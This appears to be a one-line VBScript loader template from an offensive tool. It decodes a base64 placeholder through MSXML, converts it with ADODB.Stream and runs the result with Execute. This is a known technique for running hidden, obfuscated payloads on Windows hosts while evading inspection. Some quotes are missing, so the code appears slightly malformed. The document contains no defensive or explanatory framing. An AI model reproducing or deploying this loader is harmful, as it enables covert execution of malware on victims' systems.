



Set A = CreateObject(Msxml2.DOMDocument.3.0).CreateElement(base64):A.datatype = bin.base64:A.text = {base64_daivcl} :Set B=CreateObject("ADODB.Stream"):B.Type=1:B.Open:B.Write A.nodeTypedValue:B.Position=0:B.Type=2:B.CharSet=us-ascii:Execute B.ReadText